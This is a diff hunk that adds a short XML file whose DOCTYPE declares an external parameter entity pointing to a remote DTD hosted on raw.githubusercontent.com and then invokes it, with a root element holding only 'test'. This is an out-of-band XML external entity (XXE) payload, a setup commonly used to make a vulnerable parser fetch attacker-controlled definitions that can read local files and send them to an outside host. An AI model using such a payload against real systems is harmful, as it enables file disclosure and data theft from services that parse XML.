@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/spyrohiro/Bejing-Air-Quality/refs/heads/main/files.dtd?v=1">
+  %remote;
+]>
+<root>test</root>
